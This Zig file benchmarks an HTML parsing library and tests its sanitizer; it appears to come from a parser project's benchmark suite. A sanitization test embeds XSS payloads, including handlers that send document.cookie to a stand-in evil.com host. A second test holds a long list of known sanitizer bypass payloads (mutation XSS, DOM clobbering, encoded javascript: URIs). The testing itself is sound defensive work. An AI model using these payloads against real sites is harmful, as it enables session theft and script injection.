    const msD3 = @as(f64, @floatFromInt(timeD3)) / ns_to_ms;

    // D4: Raw HTML → parseAndAppend (reused doc, no normalization - ULTIMATE!)
    timer.reset();
    const docD4 = try z.createDocFromString("");
    defer z.destroyDocument(docD4);
    var parserD4 = try z.Parser.init(allocator);
    defer parserD4.deinit();
    const bodyD4 = z.bodyElement(docD4);
    for (0..iterations) |_| {
        try parserD4.parseAndAppend(bodyD4.?, medium_html, .body, .none);
        _ = try z.setInnerHTML(bodyD4.?, ""); // reset
    }
    const timeD4 = timer.read();
    const msD4 = @as(f64, @floatFromInt(timeD4)) / ns_to_ms;

    z.print("D1. reuse doc, no parser → parseFromString:           {d:.2} ms/op, {d:.1} kB/s  🚀\n", .{ msD1 / iter, kb_size * iter / msD1 });
    z.print("D2. new doc,      parser → parser.parse:          {d:.2} ms/op, {d:.1} kB/s\n", .{ msD2 / iter, kb_size * iter / msD2 });
    z.print("D3. new doc,   no parser → createDocFromString:   {d:.2} ms/op, {d:.1} kB/s\n", .{ msD3 / iter, kb_size * iter / msD3 });
    z.print("D4. reuse doc,    parser, parseAndAppend:         {d:.2} ms/op, {d:.1} kB/s  \n", .{ msD4 / iter, kb_size * iter / msD4 });

    // ===================================================================
    // SUMMARY & KEY INSIGHTS
    // ===================================================================
    z.print("\n=== KEY INSIGHTS ===\n", .{});
    z.print("🚀 FASTEST: D1 (raw parseFromString, reused doc)    = {d:.1} kB/s\n", .{kb_size * iter / msD1});
    z.print("⭐ DOM NORM: B1 (parser, new doc = parser.parse + DOM norm) = {d:.1} kB/s\n", .{kb_size * iter / msB1});
    z.print("\n\n", .{});
    z.print("- createDocFromString parses directly into fresh document\n", .{});
    z.print("- Reused documents have reset overhead (parseFromString(\"\"))\n", .{});
    z.print("- parseAndAppend has fragment creation/template wrapping overhead\n", .{});
    z.print("- DOM normalization is significantly faster than string pre-normalization\n", .{});
}

/// Simple template interpolation - replaces {key} with values
fn interpolateTemplate(allocator: std.mem.Allocator, template: []const u8, key: []const u8, value: []const u8) ![]u8 {
    const placeholder = try std.fmt.allocPrint(allocator, "{{{s}}}", .{key});
    defer allocator.free(placeholder);

    // Count occurrences to pre-allocate
    var count: usize = 0;
    var pos: usize = 0;
    while (std.mem.indexOf(u8, template[pos..], placeholder)) |found| {
        count += 1;
        pos += found + placeholder.len;
    }

    if (count == 0) {
        return try allocator.dupe(u8, template);
    }

    // Calculate new size and allocate
    const new_size = template.len + (value.len * count) - (placeholder.len * count);
    var result = try std.ArrayList(u8).initCapacity(allocator, new_size);

    pos = 0;
    while (std.mem.indexOf(u8, template[pos..], placeholder)) |found| {
        const actual_pos = pos + found;
        try result.appendSlice(allocator, template[pos..actual_pos]);
        try result.appendSlice(allocator, value);
        pos = actual_pos + placeholder.len;
    }
    try result.appendSlice(allocator, template[pos..]);

    return result.toOwnedSlice(allocator);
}

/// Server-side rendering benchmark - simulates HTMX-like behavior
/// Load DOM once, parse/CSS engines once, then repeatedly:
/// 1. Target elements with CSS selectors
/// 2. Modify found nodes with template interpolation
/// 3. Serialize modified HTML
/// 4. Verify original DOM stays untouched
fn serverSideRenderingBenchmark(allocator: std.mem.Allocator) !void {
    z.print("\n=== SERVER-SIDE RENDERING BENCHMARK (HTMX-like) ===\n", .{});

    // Create the same medium-sized realistic page (38kB) used in the parsing benchmark
    var html_builder: std.ArrayList(u8) = .empty;
    defer html_builder.deinit(allocator);
    try html_builder.ensureTotalCapacity(allocator, 50_000);
    try html_builder.appendSlice(allocator,
        \\<!DOCTYPE html>
        \\<!-- Page header comment -->
        \\<html lang="en">
        \\  <head>
        \\    <meta charset="UTF-8"/>
        \\    <title>Performance Blog - Testing HTML Parser</title>
        \\    <meta name="description" content="A test blog for performance benchmarking"/>
        \\    <meta name="viewport" content="width=device-width, initial-scale=1"/>
        \\    <link rel="stylesheet" href="/css/main.css"/>
        \\    <link rel="preconnect" href="https://fonts.googleapis.com"/>
        \\    <style>
        \\      /* Inline CSS for performance testing */
        \\      .blog-post { margin: 2rem 0; padding: 1.5rem; }
        \\      .post-title { color: #333; font-size: 1.5rem; }
        \\      .post-meta { color: #666; font-size: 0.9rem; }
        \\      /* More CSS rules... */
        \\    </
        \\    <script src="/js/analytics.js"></>
        \\  </head>
        \\  <body class="blog-layout">
        \\    <header class="site-header">
        \\      <nav class="main-nav">
        \\        <ul class="nav-list">
        \\          <li><a href="/">Home</a></li>
        \\          <li><a href="/blog">Blog</a></li>
        \\          <li><a href="/about">About</a></li>
        \\        </ul>
        \\        <!-- Navigation comment -->
        \\        <code> const std = @import("std");\n const z = @import("../root.zig");\n</code>
        \\      </nav>
        \\    </header>
        \\
        \\    <main class="content">
    );

    // Add multiple blog posts
    for (0..20) |i| {
        try html_builder.appendSlice(allocator,
            \\      <article class="blog-post" data-post-id="{post_id}">
            \\        <!-- Post comment -->
            \\        <header class="post-header">
            \\          <h2 class="post-title" hx-get="/posts/{post_id}/edit" hx-target="#edit-modal">
        );
        const title = try std.fmt.allocPrint(allocator, "Blog Post #{d}: {s}", .{ i + 1, "title_template" });
        defer allocator.free(title);
        try html_builder.appendSlice(allocator, title);
        try html_builder.appendSlice(allocator,
            \\</h2>
            \\          <div class="post-meta">
            \\            <span class="author">{author_name}</span>
            \\            <time datetime="2024-01-01">{publish_date}</time>
            \\            <span class="views" hx-get="/posts/{post_id}/views" hx-trigger="revealed">{view_count} views</span>
            \\          </div>
            \\        </header>
            \\
            \\        <div class="post-content">
            \\          <p>Welcome {user_name}! This is a sample blog post content for performance testing. It contains <strong>bold text</strong>, <em>italic text</em>, and <a href="/link">links</a>.</p>
            \\          <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Current user: {user_name}, Post ID: {post_id}</p>
            \\          
            \\          <blockquote>
            \\            <p>This is a quote block for testing purposes.</p>
            \\            <cite>{quote_author}</cite>
            \\          </blockquote>
            \\
            \\          <ul class="post-list">
            \\            <li>First list item with <code>inline code</code></li>
            \\            <li>Second list item for {user_name}</li>
            \\            <li>Third list item - {notification_count} notifications</li>
            \\          </ul>
            \\
            \\          <div class="newsletter-signup">
            \\            <h3>Subscribe to Newsletter, {user_name}!</h3>
            \\            <form hx-post="/newsletter/subscribe" hx-swap="outerHTML">
            \\              <div class="form-group">
            \\                <label for="email">Email:</label>
            \\                <input type="email" id="email" name="email" value="{user_email}" required/>
            \\              </div>
            \\              <button type="submit" hx-loading-states>Subscribe Now</button>
            \\            </form>
            \\          </div>
            \\        </div>
            \\
            \\        <footer class="post-footer">
            \\          <div class="tags">
            \\            <span class="tag">performance</span>
            \\            <span class="tag">html</span>
            \\            <span class="tag">{dynamic_tag}</span>
            \\          </div>
            \\          <div class="actions">
            \\            <button hx-post="/posts/{post_id}/like" hx-swap="innerHTML">❤️ {like_count}</button>
            \\            <button hx-get="/posts/{post_id}/comments" hx-target="#comments-{post_id}">💬 {comment_count}</button>
            \\          </div>
            \\        </footer>
            \\      </article>
            \\
        );
    }
    try html_builder.appendSlice(allocator,
        \\    </main>
        \\
        \\    <aside class="sidebar">
        \\      <!-- Sidebar comment -->
        \\      <div class="widget recent-posts">
        \\        <h3>Recent Posts</h3>
        \\        <ul>
        \\          <li><a href="/post1">Recent Post 1</a></li>
        \\          <li><a href="/post2">Recent Post 2</a></li>
        \\          <li><a href="/post3">Recent Post 3</a></li>
        \\        </ul>
        \\      </div>
        \\
        \\      <div class="widget newsletter">
        \\        <h3>Newsletter</h3>
        \\        <p>Subscribe to our newsletter for updates.</p>
        \\        <form>
        \\          <input type="email" placeholder="Your email"/>
        \\          <button>Subscribe</button>
        \\        </form>
        \\      </div>
        \\    </aside>
        \\
        \\    <footer class="site-footer">
        \\      <!-- Footer comment -->
        \\      <p>&copy; 2024 Performance Blog. All rights reserved.</p>
        \\    </footer>
        \\
        \\    <script>
        \\      // Performance tracking
        \\      console.log('Page loaded in:', performance.now(), 'ms');
        \\    </script>
        \\  </body>
        \\</html>
    );

    // Setup - load document once for all operations (using medium 38kB HTML)
    const original_html = try html_builder.toOwnedSlice(allocator);
    defer allocator.free(original_html);

    // Load document once (like loading a template in server memory)
    const doc = try z.createDocFromString(original_html);
    defer z.destroyDocument(doc);

    // Setup parser once
    var parser = try z.Parser.init(allocator);
    defer parser.deinit();

    // Store original content for verification
    const original_content = try z.outerNodeHTML(allocator, z.documentRoot(doc).?);
    defer allocator.free(original_content);

    z.print("Original document loaded ({} bytes)\n", .{original_content.len});

    // Benchmark parameters
    const iterations = 1000;
    const ns_to_ms: f64 = 1_000_000.0;

    // Test scenario 1: Update blog post titles dynamically
    z.print("\n--- Test 1: Dynamic blog post title updates ---\n", .{});
    var timer = std.time.Timer.start() catch unreachable;

    for (0..iterations) |i| {
        // 1. Target first blog post title with CSS selector
        const title_elements = try z.querySelectorAll(allocator, doc, ".post-title");
        defer allocator.free(title_elements);

        if (title_elements.len > 0) {
            const title_element = title_elements[0];

            // 2. Clone the element for modification (original stays untouched)
            const cloned_title = z.cloneNode(z.elementToNode(title_element)).?;
            defer z.destroyNode(cloned_title);

            // 3. Modify the cloned element
            const new_title = try std.fmt.allocPrint(allocator, "Updated Blog Post #{}", .{i + 1});
            defer allocator.free(new_title);
            _ = try z.setInnerHTML(z.nodeToElement(cloned_title).?, new_title);

            // 4. Serialize modified element (this is what gets sent to client)
            const modified_html = try z.outerHTML(allocator, z.nodeToElement(cloned_title).?);
            defer allocator.free(modified_html);

            // In real HTMX scenario, this HTML would be sent as response
            // Track total bytes processed (simulate using the HTML)
            if (modified_html.len == 0) unreachable; // Should never be empty
        }
    }

    const time1 = timer.read();
    const ms1 = @as(f64, @floatFromInt(time1)) / ns_to_ms;
    z.print("Test 1: {d:.2} ms/op ({d:.0} ops/sec)\n", .{ ms1 / iterations, iterations * 1000.0 / ms1 });

    // Test scenario 2: Update newsletter signup forms with new content
    z.print("\n--- Test 2: Dynamic newsletter form updates ---\n", .{});
    timer.reset();

    for (0..iterations) |i| {
        // Target newsletter signup buttons with CSS selector
        const buttons = try z.querySelectorAll(allocator, doc, ".newsletter-signup button");
        defer allocator.free(buttons);

        if (buttons.len > 0) {
            const button = buttons[0];

            // Clone and modify
            const cloned_button = z.cloneNode(z.elementToNode(button)).?;
            defer z.destroyNode(cloned_button);

            const new_text = try std.fmt.allocPrint(allocator, "Subscribe Now #{}", .{i + 1});
            defer allocator.free(new_text);
            _ = try z.setInnerHTML(z.nodeToElement(cloned_button).?, new_text);

            // Add new attributes for tracking
            _ = z.setAttribute(z.nodeToElement(cloned_button).?, "data-campaign", "dynamic");
            const iteration_str = try std.fmt.allocPrint(allocator, "{}", .{i});
            defer allocator.free(iteration_str);
            _ = z.setAttribute(z.nodeToElement(cloned_button).?, "data-iteration", iteration_str);

            const modified_html = try z.outerHTML(allocator, z.nodeToElement(cloned_button).?);
            defer allocator.free(modified_html);

            // Track total bytes processed (simulate sending to client)
            if (modified_html.len == 0) unreachable; // Should never be empty
        }
    }

    const time2 = timer.read();
    const ms2 = @as(f64, @floatFromInt(time2)) / ns_to_ms;
    z.print("Test 2: {d:.2} ms/op ({d:.0} ops/sec)\n", .{ ms2 / iterations, iterations * 1000.0 / ms2 });

    // Test scenario 3: Insert new content into main content area
    z.print("\n--- Test 3: Dynamic main content insertion ---\n", .{});
    timer.reset();

    for (0..iterations) |i| {
        // Target main content area
        const main_elements = try z.querySelectorAll(allocator, doc, "main.content");
        defer allocator.free(main_elements);

        if (main_elements.len > 0) {
            const main_element = main_elements[0];

            // Clone the entire main content area
            const cloned_main = z.cloneNode(z.elementToNode(main_element)).?;
            defer z.destroyNode(cloned_main);

            // Add new dynamic blog post using parser
            const dynamic_post = try std.fmt.allocPrint(allocator,
                \\<article class="blog-post dynamic">
                \\  <header class="post-header">
                \\    <h2 class="post-title">Breaking News #{}</h2>
                \\    <div class="post-meta">
                \\      <span class="author">AI Assistant</span>
                \\      <time datetime="2024-12-09">Live Update</time>
                \\    </div>
                \\  </header>
                \\  <div class="post-content">
                \\    <p>This is dynamically inserted content for request #{}.</p>
                \\  </div>
                \\</article>
            , .{ i + 1, i + 1 });
            defer allocator.free(dynamic_post);

            try parser.parseAndAppend(z.nodeToElement(cloned_main).?, dynamic_post, .body, .strict);

            const modified_html = try z.outerHTML(allocator, z.nodeToElement(cloned_main).?);
            defer allocator.free(modified_html);

            // Track total bytes processed (simulate sending to client)
            if (modified_html.len == 0) unreachable; // Should never be empty
        }
    }

    const time3 = timer.read();
    const ms3 = @as(f64, @floatFromInt(time3)) / ns_to_ms;
    z.print("Test 3: {d:.2} ms/op ({d:.0} ops/sec)\n", .{ ms3 / iterations, iterations * 1000.0 / ms3 });

    // Test scenario 4: Inject malicious SVG content with XSS attacks (sanitized)
    z.print("\n--- Test 4: Malicious SVG injection with sanitization ---\n", .{});
    timer.reset();

    for (0..iterations) |i| {
        // Target post content areas for malicious content injection
        const content_elements = try z.querySelectorAll(allocator, doc, ".post-content");
        defer allocator.free(content_elements);

        if (content_elements.len > 0) {
            const content_element = content_elements[0];

            // Clone the content element
            const cloned_content = z.cloneNode(z.elementToNode(content_element)).?;
            defer z.destroyNode(cloned_content);

            // Inject malicious SVG with multiple XSS vectors
            const malicious_svg = try std.fmt.allocPrint(allocator,
                \\<div class="user-content">
                \\  <p>User comment #{}</p>
                \\  <svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
                \\    <script>alert('XSS Attack!');</script>
                \\    <circle cx="50" cy="50" r="40" stroke="black" fill="red" 
                \\            onload="alert('SVG XSS')" 
                \\            onclick="document.location='http://evil.com/steal?cookies='+document.cookie"/>
                \\    <foreignObject width="100" height="100">
                \\      <div xmlns="http://www.w3.org/1999/xhtml">
                \\        <script>fetch('http://evil.com/exfiltrate', {{method: 'POST', body: document.cookie}});</script>
                \\        <img src="x" onerror="alert('Foreign Object XSS')"/>
                \\      </div>
                \\    </foreignObject>
                \\    <animate attributeName="r" values="40;0;40" dur="2s" 
                \\             onbegin="eval(atob('YWxlcnQoJ0Jhc2U2NCBYU1MnKQ=='))"/>
                \\  </svg>
                \\  <script>
                \\    // Another XSS vector
                \\    window.location = 'javascript:alert("Direct Script XSS")';
                \\  </script>
                \\  <iframe src="javascript:alert('iframe XSS')" width="1" height="1"></iframe>
                \\</div>
            , .{i + 1});
            defer allocator.free(malicious_svg);

            // Parse and append with STRICT sanitization (this should remove all XSS)
            try parser.parseAndAppend(z.nodeToElement(cloned_content).?, malicious_svg, .div, .strict);

            const modified_html = try z.outerHTML(allocator, z.nodeToElement(cloned_content).?);
            defer allocator.free(modified_html);

            // Verify XSS was sanitized (should not contain script tags or event handlers)
            if (std.mem.indexOf(u8, modified_html, "<script>") != null or
                std.mem.indexOf(u8, modified_html, "onload=") != null or
                std.mem.indexOf(u8, modified_html, "onclick=") != null or
                std.mem.indexOf(u8, modified_html, "onerror=") != null or
                std.mem.indexOf(u8, modified_html, "javascript:") != null)
            {
                z.print("WARNING: XSS vectors found in sanitized output!\n", .{});
            }

            // Track total bytes processed (simulate sending sanitized content to client)
            if (modified_html.len == 0) unreachable; // Should never be empty
        }
    }

    const time4 = timer.read();
    const ms4 = @as(f64, @floatFromInt(time4)) / ns_to_ms;
    z.print("Test 4: {d:.2} ms/op ({d:.0} ops/sec)\n", .{ ms4 / iterations, iterations * 1000.0 / ms4 });

    // Test scenario 5: Template interpolation with curly brackets (HTMX-like templating)
    z.print("\n--- Test 5: Template interpolation with {{curly}} brackets ---\n", .{});
    timer.reset();

    for (0..iterations) |i| {
        // Target elements with placeholder content that needs interpolation
        const title_elements = try z.querySelectorAll(allocator, doc, ".post-title");
        defer allocator.free(title_elements);

        if (title_elements.len > 0) {
            const title_element = title_elements[0];

            // Clone the element for modification
            const cloned_title = z.cloneNode(z.elementToNode(title_element)).?;
            defer z.destroyNode(cloned_title);

            // Get current content and perform template interpolation
            const current_content = try z.innerHTML(allocator, z.nodeToElement(cloned_title).?);
            defer allocator.free(current_content);

            // Simulate real HTMX template with multiple variables
            const template_content = "{user_name}'s Blog Post #{post_id}: {title_template}";

            // Perform multiple interpolations (like a real templating engine)
            const interpolated = try interpolateTemplate(allocator, template_content, "user_name", "John Doe");
            defer allocator.free(interpolated);

            const post_id_str = try std.fmt.allocPrint(allocator, "{}", .{i + 1});
            defer allocator.free(post_id_str);

            const temp1 = try interpolateTemplate(allocator, interpolated, "post_id", post_id_str);
            defer allocator.free(temp1);

            const final_content = try interpolateTemplate(allocator, temp1, "title_template", "Performance Testing with Zig");
            defer allocator.free(final_content);

            // Set the interpolated content
            _ = try z.setInnerHTML(z.nodeToElement(cloned_title).?, final_content);

            // Also interpolate attributes (common in HTMX)
            const hx_get_template = "/posts/{post_id}/edit";
            const hx_get_value = try interpolateTemplate(allocator, hx_get_template, "post_id", post_id_str);
            defer allocator.free(hx_get_value);
            _ = z.setAttribute(z.nodeToElement(cloned_title).?, "hx-get", hx_get_value);

            // Add more dynamic attributes with interpolation
            const data_user_template = "user-{user_name}-post-{post_id}";
            const data_user_value = try interpolateTemplate(allocator, data_user_template, "user_name", "johndoe");
            defer allocator.free(data_user_value);

            const temp_data = try interpolateTemplate(allocator, data_user_value, "post_id", post_id_str);
            defer allocator.free(temp_data);
            _ = z.setAttribute(z.nodeToElement(cloned_title).?, "data-user", temp_data);

            // Serialize the fully interpolated element
            const modified_html = try z.outerHTML(allocator, z.nodeToElement(cloned_title).?);
            defer allocator.free(modified_html);

            // Verify interpolation worked (should contain interpolated values, not placeholders)
            if (std.mem.indexOf(u8, modified_html, "{user_name}") != null or
                std.mem.indexOf(u8, modified_html, "{post_id}") != null or
                std.mem.indexOf(u8, modified_html, "{title_template}") != null)
            {
                z.print("WARNING: Template interpolation incomplete!\n", .{});
            }

            // Track total bytes processed (simulate sending templated content to client)
            if (modified_html.len == 0) unreachable; // Should never be empty
        }
    }

    const time5 = timer.read();
    const ms5 = @as(f64, @floatFromInt(time5)) / ns_to_ms;
    z.print("Test 5: {d:.2} ms/op ({d:.0} ops/sec)\n", .{ ms5 / iterations, iterations * 1000.0 / ms5 });

    // Verification: Original DOM should be completely unchanged
    const final_content = try z.outerNodeHTML(allocator, z.documentRoot(doc).?);
    defer allocator.free(final_content);

    const unchanged = std.mem.eql(u8, original_content, final_content);
    z.print("\n=== VERIFICATION ===\n", .{});
    z.print("Original DOM unchanged: {} ✓\n", .{unchanged});

    if (!unchanged) {
        z.print("ERROR: Original DOM was modified!\n", .{});
        z.print("Original length: {}, Final length: {}\n", .{ original_content.len, final_content.len });
    }

    // Summary
    z.print("\n=== SUMMARY ===\n", .{});
    z.print("Server-side rendering performance (38kB HTML document):\n", .{});
    z.print("• Blog post title updates:    {d:.0} ops/sec\n", .{iterations * 1000.0 / ms1});
    z.print("• Newsletter form updates:    {d:.0} ops/sec\n", .{iterations * 1000.0 / ms2});
    z.print("• Full article insertion:     {d:.0} ops/sec\n", .{iterations * 1000.0 / ms3});
    z.print("• Malicious SVG sanitization: {d:.0} ops/sec  (strict mode)\n", .{iterations * 1000.0 / ms4});
    z.print("• Template interpolation:     {d:.0} ops/sec  ({{curly}} placeholders)\n", .{iterations * 1000.0 / ms5});
    z.print("\nThis simulates HTMX-like server rendering where:\n", .{});
    z.print("• DOM template loaded once in server memory\n", .{});
    z.print("• CSS selectors target elements for modification\n", .{});
    z.print("• Elements are cloned, modified, serialized for response\n", .{});
    z.print("• Template interpolation replaces {{}} placeholders with dynamic data\n", .{});
    z.print("• Original DOM stays pristine for next request\n", .{});
    z.print("• Parser reused across multiple requests\n", .{});
    z.print("• Malicious content is sanitized for security\n", .{});
}

fn test_dom_purify(allocator: std.mem.Allocator, _: []const u8) !void {
    const dirty =
        \\    <!-- I am ready now, click one of the buttons! -->
        \\<svg><image id="v-146" width="500" height="500" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="data:image/svg+xml;utf8,%3Csvg%20viewBox%3D%220%200%20100%20100%22%20height%3D%22100%22%20width%3D%22100%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20data-name%3D%22Layer%201%22%20id%3D%22Layer_1%22%3E%0A%20%20%3Ctitle%3ECompute%3C%2Ftitle%3E%0A%20%20%3Cg%3E%0A%20%20%20%20%3Crect%20fill%3D%22%239d5025%22%20ry%3D%229.12%22%20rx%3D%229.12%22%20height%3D%2253%22%20width%3D%2253%22%20y%3D%2224.74%22%20x%3D%2223.5%22%3E%3C%2Frect%3E%0A%20%20%20%20%3Crect%20fill%3D%22%23f58536%22%20ry%3D%229.12%22%20rx%3D%229.12%22%20height%3D%2253%22%20width%3D%2253%22%20y%3D%2222.26%22%20x%3D%2223.5%22%3E%3C%2Frect%3E%0A%20%20%3C%2Fg%3E%0A%3C%2Fsvg%3E" preserveratio="true" style="border-color: rgb(51, 51, 51); box-sizing: border-box; color: rgb(51, 51, 51); cursor: move; font-family: sans-serif; font-size: 14px; line-height: 20px; outline-color: rgb(51, 51, 51); text-size-adjust: 100%; column-rule-color: rgb(51, 51, 51); -webkit-font-smoothing: antialiased; -webkit-tap-highlight-color: rgba(0, 0, 0, 0); -webkit-text-emphasis-color: rgb(51, 51, 51); -webkit-text-fill-color: rgb(51, 51, 51); -webkit-text-stroke-color: rgb(51, 51, 51); user-select: none; vector-effect: non-scaling-stroke;"></image></svg>
        \\
        \\<svg><image id="v-146" width="500" height="500" xmlns:xlink="http://www.w3.org/1999/xlink" href="data:image/svg+xml;utf8,%3Csvg%20viewBox%3D%220%200%20100%20100%22%20height%3D%22100%22%20width%3D%22100%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20data-name%3D%22Layer%201%22%20id%3D%22Layer_1%22%3E%0A%20%20%3Ctitle%3ECompute%3C%2Ftitle%3E%0A%20%20%3Cg%3E%0A%20%20%20%20%3Crect%20fill%3D%22%239d5025%22%20ry%3D%229.12%22%20rx%3D%229.12%22%20height%3D%2253%22%20width%3D%2253%22%20y%3D%2224.74%22%20x%3D%2223.5%22%3E%3C%2Frect%3E%0A%20%20%20%20%3Crect%20fill%3D%22%23f58536%22%20ry%3D%229.12%22%20rx%3D%229.12%22%20height%3D%2253%22%20width%3D%2253%22%20y%3D%2222.26%22%20x%3D%2223.5%22%3E%3C%2Frect%3E%0A%20%20%3C%2Fg%3E%0A%3C%2Fsvg%3E" preserveratio="true" style="border-color: rgb(51, 51, 51); box-sizing: border-box; color: rgb(51, 51, 51); cursor: move; font-family: sans-serif; font-size: 14px; line-height: 20px; outline-color: rgb(51, 51, 51); text-size-adjust: 100%; column-rule-color: rgb(51, 51, 51); -webkit-font-smoothing: antialiased; -webkit-tap-highlight-color: rgba(0, 0, 0, 0); -webkit-text-emphasis-color: rgb(51, 51, 51); -webkit-text-fill-color: rgb(51, 51, 51); -webkit-text-stroke-color: rgb(51, 51, 51); user-select: none; vector-effect: non-scaling-stroke;"></image></svg>
        \\
        \\<div aria-labelledby="msg--title" role="dialog" class="msg"><button class="modal-close" aria-label="close" type="button"><i class="icon-close"></i>some button</button></div>
        \\
        \\<input type=checkbox checked><input type=checkbox onclick>
        \\
        \\<svg><defs><filter id="f1"><feGaussianBlur in="SourceGraphic" stdDeviation="15" /></filter></defs><rect width="90" height="90" stroke="green" stroke-width="3" fill="yellow" filter="url(#f1)" /></svg>
        \\
        \\<b href="javascript:alert(1)" title="javascript:alert(2)"></b>
        \\
        \\<img src="data:,123"><audio src="data:,456"></audio><video src="data:,789"></video><source src="data:,012"><div src="data:,345">
        \\
        \\<img src=x name=createElement><img src=y id=createElement>
        \\
        \\<img src=x name=cookie>
        \\
        \\123<a href=' javascript:alert(1)'>I am a dolphin!</a>
        \\
        \\123<a href=' javascript:alert(1)'>I am a dolphin too!</a>
        \\
        \\123<a href=' javascript:alert(1)'>CLICK</a><a href='&#xA0javascript:alert(1)'>CLICK</a><a href='&#x1680;javascript:alert(1)'>CLICK</a><a href='&#x180E;javascript:alert(1)'>CLICK</a><a href='&#x2000;javascript:alert(1)'>CLICK</a><a href='&#x2001;javascript:alert(1)'>CLICK</a><a href='&#x2002;javascript:alert(1)'>CLICK</a><a href='&#x2003;javascript:alert(1)'>CLICK</a><a href='&#x2004;javascript:alert(1)'>CLICK</a><a href='&#x2005;javascript:alert(1)'>CLICK</a><a href='&#x2006;javascript:alert(1)'>CLICK</a><a href='&#x2006;javascript:alert(1)'>CLICK</a><a href='&#x2007;javascript:alert(1)'>CLICK</a><a href='&#x2008;javascript:alert(1)'>CLICK</a><a href='&#x2009;javascript:alert(1)'>CLICK</a><a href='&#x200A;javascript:alert(1)'>CLICK</a><a href='&#x200B;javascript:alert(1)'>CLICK</a><a href='&#x205f;javascript:alert(1)'>CLICK</a><a href='&#x3000;javascript:alert(1)'>CLICK</a>
        \\
        \\<img src=data:image/jpeg,ab798ewqxbaudbuoibeqbla>
        \\
        \\<img src="
        \\data:image/jpeg,ab798ewqxbaudbuoibeqbla">
        \\
        \\<img src='javascript:while(1){}'>
        \\
        \\<a href=data:,evilnastystuff>clickme</a>
        \\
        \\123456
        \\
        \\<form onmouseover='alert(1)'><input name="attributes"><input name="attributes">
        \\
        \\<img src=x name=getElementById>
        \\
        \\<a href="#some-code-here" id="location">invisible
        \\
        \\<div onclick=alert(0)><form onsubmit=alert(1)><input onfocus=alert(2) name=parentNode>123</form></div>
        \\
        \\<form onsubmit=alert(1)><input onfocus=alert(2) name=nodeName>123</form>
        \\
        \\<form onsubmit=alert(1)><input onfocus=alert(2) name=nodeType>123</form>
        \\
        \\<form onsubmit=alert(1)><input onfocus=alert(2) name=children>123</form>
        \\
        \\<form onsubmit=alert(1)><input onfocus=alert(2) name=attributes>123</form>
        \\
        \\<form onsubmit=alert(1)><input onfocus=alert(2) name=removeChild>123</form>
        \\
        \\<form onsubmit=alert(1)><input onfocus=alert(2) name=removeAttributeNode>123</form>
        \\
        \\<form onsubmit=alert(1)><input onfocus=alert(2) name=setAttribute>123</form>
        \\
        \\<style>*{color: red}</style>
        \\
        \\<p>hello</p>
        \\
        \\<listing>&lt;img onerror="alert(1);//" src=x&gt;<t t></listing>
        \\
        \\<img src=x id/=' onerror=alert(1)//'>
        \\
        \\<textarea>@shafigullin</textarea><!--</textarea><img src=x onerror=alert(1)>-->
        \\
        \\<b><noscript><!-- </noscript><img src=x onerror=alert(1) --></noscript>
        \\
        \\<b><noscript><a alt="</noscript><img src=x onerror=alert(1)>"></noscript>
        \\
        \\<body><template><s><template><s><img src=x onerror=alert(1)>@shafigullin</s></template></s></template>
        \\
        \\<a href="javascript:alert(1)">@shafigullin<a>
        \\
        \\<option><style></option></select><b><img src=x onerror=alert(1)></style></option>
        \\
        \\<option><iframe></select><b><script>alert(1)</script>
        \\
        \\</iframe></option>
        \\
        \\<b><style><style/><img src=x onerror=alert(1)>
        \\
        \\<b><style><style////><img src=x onerror=alert(1)></style>
        \\
        \\<math xmlns="http://www.w3.org/1998/Math/MathML" display="block">
        \\  <mrow>
        \\    <menclose notation="box"><mi>a</mi></menclose><mo>,</mo>
        \\    <menclose notation="box"><mi mathcolor="#FF0000">a</mi></menclose><mo>,</mo>
        \\    <menclose notation="box" mathcolor="#FF0000"><mi>a</mi></menclose><mo>,</mo>
        \\    <menclose notation="box" mathbackground="#80FF80"><mi mathcolor="#FF0000">a</mi></menclose><mo>,</mo>
        \\    <menclose notation="box" mathcolor="#FF0000" mathbackground="#80FF80"><mi>a</mi></menclose><mo>,</mo>
        \\    <menclose notation="box"><mi mathbackground="#80FF80">a</mi></menclose>
        \\  </mrow>
        \\</math>
        \\
        \\<image name=body><image name=adoptNode>@mmrupp<image name=firstElementChild><svg onload=alert(1)>
        \\
        \\<a href="javascript:alert(1)">@shafigullin<a>
        \\
        \\<image name=activeElement><svg onload=alert(1)>
        \\
        \\<image name=body><img src=x><svg onload=alert(1); autofocus>, <keygen onfocus=alert(1); autofocus>
        \\
        \\<div onmouseout="javascript:alert(/superevr/)" x=yscript: n>@superevr</div>
        \\
        \\<button remove=me onmousedown="javascript:alert(1);" onclick="javascript:alert(1)" >@giutro
        \\
        \\<a href="javascript:123" onclick="alert(1)">CLICK ME (bypass by @shafigullin)</a>
        \\
        \\<isindex x="javascript:" onmouseover="alert(1)" label="variation of bypass by @giutro">
        \\
        \\<div wow=removeme onmouseover=alert(1)>text
        \\
        \\<input x=javascript: autofocus onfocus=alert(1)><svg id=1 onload=alert(1)></svg>
        \\
        \\<isindex src="javascript:" onmouseover="alert(1)" label="bypass by @giutro" />
        \\
        \\<a href="javascript:123" onclick="alert(1)">CLICK ME (bypass by @shafigullin)</a>
        \\
        \\<form action="javasc
        \\ript:alert(1)"><button>XXX</button></form>
        \\
        \\<div id="1"><form id="foobar"></form><button form="foobar" formaction="javascript:alert(1)">X</button>//["'`-->]]>]</div>
        \\
        \\<div id="2"><meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi//["'`-->]]>]</div>
        \\
        \\<div id="3"><meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>//["'`-->]]>]</div>
        \\
        \\<div id="4">0?<script>Worker("#").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts('data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk'))//["'`-->]]>]</div>
        \\
        \\<div id="5"><script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(5)',384,null,'rsa-dual-use')</script>//["'`-->]]>]</div>
        \\
        \\<div id="6"><script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>//["'`-->]]>]</div>
        \\
